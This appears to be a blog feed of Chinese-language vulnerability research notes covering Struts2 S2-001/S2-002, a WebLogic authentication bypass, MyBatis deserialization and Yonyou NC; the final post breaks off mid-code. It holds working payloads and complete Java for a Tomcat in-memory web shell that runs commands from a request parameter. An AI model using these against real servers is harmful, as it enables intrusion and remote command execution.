href="#doEndTag处理输出内容并写入当前jsp页面中" class="headerlink" title="doEndTag处理输出内容并写入当前jsp页面中"></a>doEndTag处理输出内容并写入当前jsp页面中</h2><p><code>doEndTag</code>更直观是对最后的输出做处理</p><p><img src="./image-20201221212313893.png" srcset="/img/loading.gif" alt="image-20201221212313893"></p><p>跟进<code>UrlHelper::buildUrl</code>方法，对最后输出result进行拼接，依次拼接当前访问的WEB路径、this.paramters中的两个值。</p><p><img src="./image-20201221212810277.png" srcset="/img/loading.gif" alt="image-20201221212810277"></p><p><code>URL::end</code>最后收尾没有调用模版写入，而是直接调用write写入当前jsp页面中.</p><p><img src="./image-20201221212916474.png" srcset="/img/loading.gif" alt="image-20201221212916474"></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><pre><code class="hljs url">http:&#x2F;&#x2F;localhost:8085&#x2F;Struts2_002_war_exploded&#x2F;?%3Cscript%3Ealert(1);%3C&#x2F;script%3E</code></pre><p><img src="./image-20201221213029799.png" srcset="/img/loading.gif" alt="image-20201221213029799"></p><p><img src="./image-20201221213119562.png" srcset="/img/loading.gif" alt="image-20201221213119562"></p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>比较懒,只是单纯的替换了script字符串很容易绕过.</p><p>参考：<a href="https://dean2021.github.io/posts/s2-002/" target="_blank" rel="noopener">https://dean2021.github.io/posts/s2-002/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Struts2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title> Struts2漏洞笔记之S2-001</title>
    <link href="/2020/12/24/Struts2%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B9%8BS2-001/"/>
    <url>/2020/12/24/Struts2%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B9%8BS2-001/</url>
    
    <content type="html"><![CDATA[<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。 Struts 2是Struts的下一代产品，是在struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。</p><p>1.OGNL（Object Graph Navigation Language）对象导航图语言</p><p>　　Struts2框架使用OGNL作为默认的表达式语言，OGNL（Object Graph Navigation Language），是一种表达式语言，目的是为了在不能写Java代码的地方执行java代码；主要作用是用来存数据和取数据的。</p><p>2.关于Xwork、ActionContext、OgnlValueStack相关知识可以参考链接：<a href="https://milkfr.github.io/java/2019/02/04/java-struts2-4/" target="_blank" rel="noopener">https://milkfr.github.io/java/2019/02/04/java-struts2-4/</a></p><h1 id="版本影响"><a href="#版本影响" class="headerlink" title="版本影响"></a>版本影响</h1><pre><code class="hljs angelscript"><span class="hljs-number">2.0</span><span class="hljs-number">.1</span> ~ <span class="hljs-number">2.0</span><span class="hljs-number">.8</span></code></pre><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>处理登陆问题上，验证失败返回原界面，在处理回显时，框架解析JSP页面标签时会对用户输入的Value值获取，在获取对应的Value值中递归解析<code>%{、}</code>造成了二次解析，最终触发表达式注入漏洞，执行任意代码。</p><h2 id="程序入口"><a href="#程序入口" class="headerlink" title="程序入口"></a>程序入口</h2><p>struts 2.0.8中Web.xml配置<code>org.apache.struts2.dispatcher.FilterDispatcher</code>为程序入口点，执行doFilter方法.在其中较关键创建OgnlValueStack，并添加相应的数据.</p><h2 id="OgnlValueStack创建和数据载入"><a href="#OgnlValueStack创建和数据载入" class="headerlink" title="OgnlValueStack创建和数据载入"></a>OgnlValueStack创建和数据载入</h2><p>在Ognl解析表达式中存在关键的三要素<code>expr、root、Context</code>，在expr为可解析的表达式需要符合相关语法。接着需要关注root、Context如何载入到对象中。根据框架的分析可知Struts2中利用OgnlValueStack存储数据栈，而在创建之后将相关参数插入进root与Context.</p><p>跟进程序入口点<code>FilterDispatcher.doFilter-&gt;this.dispatcher.serviceAction(....)</code>中会先调用<code>this.createContextMap</code></p><p><code>Dispatcher.createContextMap</code>会获取当前请求的参数并以<code>Map</code>形式保存，最后载入<code>extracontext</code>中.</p><p><img src="./image-20201209215203978.png" srcset="/img/loading.gif" alt="image-20201209215203978"></p><p>接着会获取当前访问的命名空间、文件名、方法名</p><p>在初始化<code>ActionProxy</code>时会创建一个<code>OgnlValueStack</code>实例(<code>DefaultActionInvocation.createContextMap()</code>)</p><p>接着会将extraContext通过putAll存放进stack.Context中.</p><p><img src="./image-20201209214207476.png" srcset="/img/loading.gif" alt="image-20201209214207476"></p><p>调用push将当前访问生成的实例化Action存入stack.root中.但是这时生成的Action并没有设置上<code>username</code>与<code>password</code></p><p><img src="./image-20201209214609324.png" srcset="/img/loading.gif" alt="image-20201209214609324"></p><h2 id="ParametersInterceptor载入参数"><a href="#ParametersInterceptor载入参数" class="headerlink" title="ParametersInterceptor载入参数"></a>ParametersInterceptor载入参数</h2><blockquote><p>ParametersInterceptor拦截器又继承自MethodFilterInterceptor，其主要功能是把ActionContext中的请求参数设置到ValueStack中，如果栈顶是当前Action则把请求参数设置到了Action中，如果栈顶是一个model(Action实现了ModelDriven接口)则把参数设置到了model中。</p></blockquote><p>跟进代码看下究竟</p><p><code>ParametersInterceptor.doIntercept</code>会从ActionContext上下文中取出<code>parameters</code></p><p><img src="./image-20201210104747537.png" srcset="/img/loading.gif" alt="image-20201210104747537"></p><p>跟进<code>ParametersInterceptor.setParameters</code>一路跟进在<code>OgnlRuntime.setMethodValue</code>中根菌propertyName获取该属性的set方法.接着执行<code>OgnlRuntime.callAppropriateMethod</code>反射执行<code>setPassword</code>方法</p><p><img src="./image-20201210105247323.png" srcset="/img/loading.gif" alt="image-20201210105247323"></p><h2 id="执行Action"><a href="#执行Action" class="headerlink" title="执行Action"></a>执行Action</h2><p>在一系列拦截器执行完毕后，调用DefaulActionInvocation.invokeActionOnly()执行Action操作.继续跟进<code>DefaulActionInvocation.invokeAction</code>会先获取需要执行该Action实例的方法，该方法在创建ActionProxy获取，没有制定方法时，会默认调用<code>execute</code>方法，接着会反射执行<code>LoginAction.execute()</code></p><p><img src="./image-20201210110754593.png" srcset="/img/loading.gif" alt="image-20201210110754593"></p><h2 id="Result处理"><a href="#Result处理" class="headerlink" title="Result处理"></a>Result处理</h2><p>当执行execute返回”error”作为ResultCode返回，(可以看作账号验证失败仍然停留在登陆界面)，执行StrutsResultSupport.doExcute()后框架将会开始处理页面回显，而其中会调用中间件tomcat调度器ApplicationDispatcher由于访问jsp文件，会调用<code>JspServlet</code>处理请求。接着Struts2会利用doStartTag、doEndTag解析标签.</p><p>通过向页面请求</p><pre><code class="hljs http">username=1&amp;password=%25&#123;%40java.lang.System%40getProperty("user.dir")&#125;</code></pre><p>进入doEndTag解析标签</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">s:textfield</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"password"</span> <span class="hljs-attr">label</span>=<span class="hljs-string">"password"</span> /&gt;</span></code></pre><p>进入UIBean解析公共标签，满足IF语句后会对password拼接<code>%{</code>字符串为<code>%{password}</code>.</p><p><img src="./image-20201210193258205.png" srcset="/img/loading.gif" alt="image-20201210193258205"></p><p>之后会进入<code>TextParseUtil.translateVariables</code>递归判断当前返回字符串是否含有<code>%{}</code>字符串,满足的话会剔除掉<code>%{}</code>，执行findValue方法，从当前值栈中找到<code>password</code>获得对应的值<code>%{@java.lang.System@getProperty(&quot;user.dir&quot;)}</code></p><p><img src="./image-20201210194132579.png" srcset="/img/loading.gif" alt="image-20201210194132579"></p><p>由于<code>TextParseUtil.translateVariables</code>的递归判断，会再一次执行获得的值<code>%{@java.lang.System@getProperty(&quot;user.dir&quot;)}</code>造成二次解析，最后将结果保存值<code>parameters.nameValue</code>.在解析模版时会获取<code>parameters.nameValue</code>值，将执行代码的结果输出到浏览器上.</p><p><img src="./image-20201210194753753.png" srcset="/img/loading.gif" alt="image-20201210194753753"></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p><img src="./image-20201210200224422.png" srcset="/img/loading.gif" alt="image-20201210200224422"></p><h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><p><code>TextParseUtil.translateVariables</code>限制递归深度，仅解析一次表达式</p><p><img src="./image-20201210203428795.png" srcset="/img/loading.gif" alt="image-20201210203428795"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>其实这是第二遍分析s2-001漏洞，在调试一遍学到很多，主要从框架出发来看待这个问题.</p><p>1.ThreadLocal设计模式，保证线程安全，使得每次拿到的ActionContext不受影响.</p><p>2.二次解析漏洞挖掘思路，分析至此，究其原因在于递归调用，最后在调用stack.findValue时会解析表达式.(或许写个全局搜findValue有惊喜呢)</p><p>3.过一遍文档和框架的生命周期在搭环境和理解代码也会有帮助.</p><p>该篇文章没有对Ognl如何解析表达式进一步分析，感觉有点麻烦，后续单独切一个知识点来学习.</p>]]></content>
    
    
    
    <tags>
      
      <tag>Struts2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2020-14882挖掘思路学习笔记</title>
    <link href="/2020/11/01/CVE-2020-14882%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2020/11/01/CVE-2020-14882%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​    学习CVE-2020-14882挖掘思路,看了CVE-2020-14883，挖掘思路配合灰盒在页面点击扩展按钮之类操作会带有handle参数，该参数明显会加载某个类.主要还是找危险类利用，不细跟了</p><p><img src="./image-20201101194804900.png" srcset="/img/loading.gif" alt="image-20201101194804900"></p><h1 id="CVE-2020-14882"><a href="#CVE-2020-14882" class="headerlink" title="CVE-2020-14882"></a>CVE-2020-14882</h1><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><pre><code class="hljs llvm">http://localhost:<span class="hljs-number">30443</span>/console/images/<span class="hljs-symbol">%252</span>e<span class="hljs-symbol">%252</span>e<span class="hljs-symbol">%2</span>fconsole.portal?_nfpb=<span class="hljs-keyword">true</span>&amp;_pageLabel=HomePage<span class="hljs-number">1</span></code></pre><h2 id="漏洞挖掘思路"><a href="#漏洞挖掘思路" class="headerlink" title="漏洞挖掘思路"></a>漏洞挖掘思路</h2><ol><li><p>找身份认证处理的逻辑</p><p>权限认证关键参数unrestricted</p><p><img src="./image-20201101174718956.png" srcset="/img/loading.gif" alt="image-20201101174718956"></p><p><img src="./image-20201101175017473.png" srcset="/img/loading.gif" alt="image-20201101175017473"></p></li><li><p>绕过的关键处，静态资源不做权限认证，</p><ol><li>“/image/“匹配静态资源，更改unrestricted=true,绕过身份认证</li><li>匹配路由中的”console.portal” 进入管理界面servlet,映射路由见web.xml</li></ol></li></ol><p><img src="./image-20201101175802839.png" srcset="/img/loading.gif" alt="image-20201101175802839"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>匹配servlet之前做了权限认证，而静态资源不在权限限制范围内，可以直接bypass。分析中抓住权限控制返回的类比较关键的参数.</p><p>灰盒测试思路：</p><p>​        1.访问静态资源：<a href="http://localhost:30443/console/css/changemgmt.portal" target="_blank" rel="noopener">http://localhost:30443/console/css/changemgmt.portal</a> 不需要权限认证，匹配/css/</p><p>​        2. 管理界面为console.portal相同后缀,且被web.xml映射，使用二次url编码+静态资源目录绕过测试.        </p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://testbnull.medium.com/weblogic-rce-by-only-one-get-request-cve-2020-14882-analysis-6e4b09981dbf" target="_blank" rel="noopener">https://testbnull.medium.com/weblogic-rce-by-only-one-get-request-cve-2020-14882-analysis-6e4b09981dbf</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzUzNTEyMTE0Mw==&amp;mid=2247484235&amp;idx=1&amp;sn=3b4561f398f86af88ca717e051318e9f&amp;chksm=fa8b1ed3cdfc97c57f6c9a53fdb7f807470306d96718781e47098fa771f40a33a2d1b8aa3099&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzUzNTEyMTE0Mw==&amp;mid=2247484235&amp;idx=1&amp;sn=3b4561f398f86af88ca717e051318e9f&amp;chksm=fa8b1ed3cdfc97c57f6c9a53fdb7f807470306d96718781e47098fa771f40a33a2d1b8aa3099&amp;scene=21#wechat_redirect</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzI3NzE0OTg5Mg==&amp;mid=2247483703&amp;idx=1&amp;sn=698149c18a2b8aa82658d8878667cdc3" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI3NzE0OTg5Mg==&amp;mid=2247483703&amp;idx=1&amp;sn=698149c18a2b8aa82658d8878667cdc3</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>weblogic</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xxl-job api未授权Hessian2反序列化(密文保护)</title>
    <link href="/2020/10/29/xxl-job-api%E6%9C%AA%E6%8E%88%E6%9D%83Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2020/10/29/xxl-job-api%E6%9C%AA%E6%8E%88%E6%9D%83Hessian2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">别猜了，密码我都不知道</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="160ccd880b621f45d9dba19e78e80fde8b93d47ac657b45b4ae5edeb8fd70554"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>xxl-job</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[漏洞挖掘] Apache Solr 最新版SSRF漏洞(密文保护)</title>
    <link href="/2020/10/16/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-Apache-Solr-%E6%9C%80%E6%96%B0%E7%89%88SSRF%E6%BC%8F%E6%B4%9E/"/>
    <url>/2020/10/16/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-Apache-Solr-%E6%9C%80%E6%96%B0%E7%89%88SSRF%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">别猜了，密码我都不知道</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="beeb0f2ebb46a2fc0ed271cb7efb07b471ca8f32066da61fb9b1f4e0d3fe49d8">ce21364c024e4d0343d7c954eecff585</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>Sold</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2020-26945 mybatis反序列化复现思考</title>
    <link href="/2020/10/14/CVE-2020-26945-mybatis%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0%E6%80%9D%E8%80%83/"/>
    <url>/2020/10/14/CVE-2020-26945-mybatis%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0%E6%80%9D%E8%80%83/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>就不完整写了，漏洞刚出来时候跟了跟，发现自己的想法行不通，当作记录吧.一些碎碎念</p><h1 id="漏洞笔记"><a href="#漏洞笔记" class="headerlink" title="漏洞笔记"></a>漏洞笔记</h1><p>漏洞通告：<a href="https://github.com/mybatis/mybatis-3/pull/2079" target="_blank" rel="noopener">https://github.com/mybatis/mybatis-3/pull/2079</a></p><p>​    开启二级缓存后第一次查询的结果会被缓存至PerpetualCache.cache中，起初的想法是能不能动本地缓存LocalCache，通过类似内存shell的思路反射修改内存Map.</p><p><img src="./image-20201014093350160.png" srcset="/img/loading.gif" alt="image-20201014093350160"></p><p>​    在实战场景下通过任意代码执行能够修改cache中的Map，将key对应的value修改为我们的恶意类，在请求一次sql语句就能成功执行代码。但是该属性或者调用的cache类都由MappedStatement类息息相关。然而该类没有构造方法，无法反射获取，也就造成了不能直接通过反射修改cache中的value值.</p><p><img src="./image-20201013193401259.png" srcset="/img/loading.gif" alt="image-20201013193401259"></p><p>最后的思路或许只能利用缓存库，手动修改内容，造成反序列化，实战可以配合redis漏洞</p><p>参考如下链接：<a href="https://mp.weixin.qq.com/s?__biz=MzUzNTEyMTE0Mw==&amp;mid=2247484196&amp;idx=1&amp;sn=735666b28cff6e6552d8f3e16b1be9a5&amp;chksm=fa8b1ebccdfc97aa80b6103587fd418b63c6b0d290cd4229ccc999b3706fe4f325595049a7ce&amp;mpshare=1&amp;scene=23&amp;srcid=1013pFDy9OUsVb24733hEAhA&amp;sharer_sharetime=1602582161965&amp;sharer_shareid=8a8448ee03016e30de742559b7359a01%23rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzUzNTEyMTE0Mw==&amp;mid=2247484196&amp;idx=1&amp;sn=735666b28cff6e6552d8f3e16b1be9a5&amp;chksm=fa8b1ebccdfc97aa80b6103587fd418b63c6b0d290cd4229ccc999b3706fe4f325595049a7ce&amp;mpshare=1&amp;scene=23&amp;srcid=1013pFDy9OUsVb24733hEAhA&amp;sharer_sharetime=1602582161965&amp;sharer_shareid=8a8448ee03016e30de742559b7359a01%23rd</a></p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>开启jep290</p>]]></content>
    
    
    
    <tags>
      
      <tag>mybatis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Tomcat Servlet型内存shell</title>
    <link href="/2020/10/08/Tomcat-Servlet%E5%9E%8B%E5%86%85%E5%AD%98shell/"/>
    <url>/2020/10/08/Tomcat-Servlet%E5%9E%8B%E5%86%85%E5%AD%98shell/</url>
    
    <content type="html"><![CDATA[<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>​    在tomcat中Servlet通过web.xml解析载入容器中，而需要载入Servelt最后会被<code>Wrapper</code>类包装,通过debug分析，该<code>Wrapper</code>是通过<code>StandardContext</code>生成。所以只要反射获取<code>StandardContext</code>就能成功注册恶意Servlet.</p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>debian+Tomcat 7.0.94+jdk8u121</p><h1 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h1><p>以下是Servlet载入内存的调用栈，通过addChild将Servlet载入Children属性中，在<code>configureContext</code>方法能够看到恶意<code>Servlet</code>封装进<code>Wrapper</code>类的过程</p><p><img src="./image-20201008213155702.png" srcset="/img/loading.gif" alt="image-20201008213155702"></p><p>跟进<code>WebXml.configureContext</code>方法.将Servlet相关属性载入<code>Wrapper</code>类中,而该Wrapper通过当前<code>StandardContext</code>构造.</p><p><img src="./image-20201008220253444.png" srcset="/img/loading.gif" alt="image-20201008220253444"></p><p>最后将一个个child封装进children中.</p><p><img src="./image-20201008215723310.png" srcset="/img/loading.gif" alt="image-20201008215723310"></p><p>最后构造如下</p><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tomcat.test.context;<span class="hljs-keyword">import</span> com.sun.jmx.mbeanserver.NamedObject;<span class="hljs-keyword">import</span> org.apache.catalina.Wrapper;<span class="hljs-keyword">import</span> org.apache.catalina.core.StandardContext;<span class="hljs-keyword">import</span> org.apache.catalina.startup.Tomcat;<span class="hljs-keyword">import</span> org.apache.tomcat.util.modeler.Registry;<span class="hljs-keyword">import</span> javax.management.MBeanServer;<span class="hljs-keyword">import</span> javax.servlet.*;<span class="hljs-keyword">import</span> javax.servlet.http.*;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<span class="hljs-keyword">import</span> java.io.PrintWriter;<span class="hljs-keyword">import</span> java.lang.reflect.Field;<span class="hljs-keyword">import</span> java.util.HashMap;<span class="hljs-keyword">import</span> java.util.Map;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">shellServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;    <span class="hljs-keyword">static</span> &#123;        <span class="hljs-keyword">try</span>&#123;            MBeanServer mBeanServer = Registry.getRegistry(<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>).getMBeanServer();            <span class="hljs-comment">// 获取mbsInterceptor</span>            Field field = Class.forName(<span class="hljs-string">"com.sun.jmx.mbeanserver.JmxMBeanServer"</span>).getDeclaredField(<span class="hljs-string">"mbsInterceptor"</span>);            field.setAccessible(<span class="hljs-keyword">true</span>);            Object mbsInterceptor = field.get(mBeanServer);            <span class="hljs-comment">// 获取repository</span>            field = Class.forName(<span class="hljs-string">"com.sun.jmx.interceptor.DefaultMBeanServerInterceptor"</span>).getDeclaredField(<span class="hljs-string">"repository"</span>);            field.setAccessible(<span class="hljs-keyword">true</span>);            Object repository = field.get(mbsInterceptor);            <span class="hljs-comment">// 获取domainTb</span>            field = Class.forName(<span class="hljs-string">"com.sun.jmx.mbeanserver.Repository"</span>).getDeclaredField(<span class="hljs-string">"domainTb"</span>);            field.setAccessible(<span class="hljs-keyword">true</span>);            HashMap&lt;String, Map&lt;String, NamedObject&gt;&gt; domainTb = (HashMap&lt;String,Map&lt;String,NamedObject&gt;&gt;)field.get(repository);            <span class="hljs-comment">// 获取domain</span>            NamedObject nonLoginAuthenticator = domainTb.get(<span class="hljs-string">"Catalina"</span>).get(<span class="hljs-string">"context=/,host=localhost,name=NonLoginAuthenticator,type=Valve"</span>);            field = Class.forName(<span class="hljs-string">"com.sun.jmx.mbeanserver.NamedObject"</span>).getDeclaredField(<span class="hljs-string">"object"</span>);            field.setAccessible(<span class="hljs-keyword">true</span>);            Object object = field.get(nonLoginAuthenticator);            <span class="hljs-comment">// 获取resource</span>            field = Class.forName(<span class="hljs-string">"org.apache.tomcat.util.modeler.BaseModelMBean"</span>).getDeclaredField(<span class="hljs-string">"resource"</span>);            field.setAccessible(<span class="hljs-keyword">true</span>);            Object resource = field.get(object);            <span class="hljs-comment">// 获取context</span>            field = Class.forName(<span class="hljs-string">"org.apache.catalina.authenticator.AuthenticatorBase"</span>).getDeclaredField(<span class="hljs-string">"context"</span>);            field.setAccessible(<span class="hljs-keyword">true</span>);            StandardContext standardContext = (StandardContext) field.get(resource);            Wrapper wrapper = standardContext.createWrapper();            wrapper.setName(<span class="hljs-string">"shellServlet"</span>);            wrapper.setServletClass(<span class="hljs-string">"com.tomcat.test.context.shellServlet"</span>);            wrapper.setServlet(<span class="hljs-keyword">new</span> com.tomcat.test.context.shellServlet());            standardContext.addChild(wrapper);            standardContext.addServletMapping(<span class="hljs-string">"/shellServlet"</span>,<span class="hljs-string">"shellServlet"</span>);        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;            e.printStackTrace();        &#125;    &#125;    <span class="hljs-keyword">private</span> String message;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ServletException</span><span class="hljs-function">    </span>&#123;    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest request,</span></span><span class="hljs-function"><span class="hljs-params">                      HttpServletResponse response)</span></span><span class="hljs-function">            <span class="hljs-keyword">throws</span> ServletException, IOException</span><span class="hljs-function">    </span>&#123;        System.out.println(<span class="hljs-string">":::::::::::::::::::::::::::::::::::::::Tomcat Servlet Shell:::::::::::::::::::::::::::::::::::::::"</span>);        String cmd;        <span class="hljs-keyword">if</span> ((cmd = request.getParameter(<span class="hljs-string">"osword"</span>)) != <span class="hljs-keyword">null</span>) &#123;            Process process = Runtime.getRuntime().exec(cmd);            java.io.BufferedReader bufferedReader = <span class="hljs-keyword">new</span> java.io.BufferedReader(                    <span class="hljs-keyword">new</span> java.io.InputStreamReader(process.getInputStream()));            StringBuilder stringBuilder = <span class="hljs-keyword">new</span> StringBuilder();            String line;            <span class="hljs-keyword">while</span> ((line = bufferedReader.readLine()) != <span class="hljs-keyword">null</span>) &#123;                stringBuilder.append(line + <span class="hljs-string">'\n'</span>);            &#125;            response.getOutputStream().write(stringBuilder.toString().getBytes());            <span class="hljs-comment">// 设置响应内容类型</span>            response.setContentType(<span class="hljs-string">"text/html"</span>);            response.getOutputStream().flush();            response.getOutputStream().close();        &#125;    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span></span><span class="hljs-function">    </span>&#123;    &#125;&#125;</code></pre><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>1.<a href="http://127.0.0.1:8089/injectServlet访问载入shellServlet" target="_blank" rel="noopener">http://127.0.0.1:8089/injectServlet访问载入shellServlet</a></p><p>2.<a href="http://127.0.0.1:8089/shellServlet?osword=whoami" target="_blank" rel="noopener">http://127.0.0.1:8089/shellServlet?osword=whoami</a> 执行</p><p><img src="./image-20201008220920348.png" srcset="/img/loading.gif" alt="image-20201008220920348"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://mp.weixin.qq.com/s/D0ACXtPsj91chP4zmGpUjQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/D0ACXtPsj91chP4zmGpUjQ</a></p><p><a href="https://www.anquanke.com/post/id/214483#h3-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/214483#h3-4</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Shell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>用友NC 反序列化回显构造</title>
    <link href="/2020/09/17/%E6%9F%90NC-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0/"/>
    <url>/2020/09/17/%E6%9F%90NC-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="用友nc-反序列化回显构造思路"><a href="#用友nc-反序列化回显构造思路" class="headerlink" title="用友nc 反序列化回显构造思路"></a>用友nc 反序列化回显构造思路</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p><code>/service/monitorservlet</code>存在反序列化利用点，可以直接攻击</p><p><img src="./image-20200917212322180.png" srcset="/img/loading.gif" alt="image-20200917212322180"></p><h2 id="回显思路"><a href="#回显思路" class="headerlink" title="回显思路"></a>回显思路</h2><p>​    网上大部分cc回显是将构造的回显类塞进<code>TemplatesImpl</code>中，默认安装的用友nc开启了jdk security 过滤了<code>TemplatesImpl</code>类，导致利用网上写好的cc回显是无法成功.</p><p>​    分析后可以发现<code>org.mozilla.javascript.DefiningClassLoader</code>被加载进classpath,所以这里可以直接用<code>defineClass+tomcat</code>回显payload:<a href="https://gist.github.com/fnmsd/4d9ed529ceb6c2a464f75c379dadd3a8" target="_blank" rel="noopener">https://gist.github.com/fnmsd/4d9ed529ceb6c2a464f75c379dadd3a8</a></p><p>利用结果如下</p><p><img src="./image-20200917212820466.png" srcset="/img/loading.gif" alt="image-20200917212820466"></p><h1 id="Payload食用"><a href="#Payload食用" class="headerlink" title="Payload食用"></a>Payload食用</h1><ol><li>编译dfs</li></ol><p>做了一点修改，发现靶机会因为getWriter报错,添加了<code>p.getWriter().close();</code>效果会好一些，手动关闭流</p><p><img src="./image-20200917205452845.png" srcset="/img/loading.gif" alt="image-20200917205452845"></p><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.osword.defineclass;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<span class="hljs-keyword">import</span> java.lang.reflect.Field;<span class="hljs-keyword">import</span> java.util.HashSet;<span class="hljs-keyword">import</span> java.util.Scanner;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dfs</span> </span>&#123;    <span class="hljs-keyword">static</span> HashSet&lt;Object&gt; h;    <span class="hljs-keyword">static</span> HttpServletRequest r;    <span class="hljs-keyword">static</span> HttpServletResponse p;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;        System.out.println(<span class="hljs-string">"fuck"</span>);        r = <span class="hljs-keyword">null</span>;        p = <span class="hljs-keyword">null</span>;        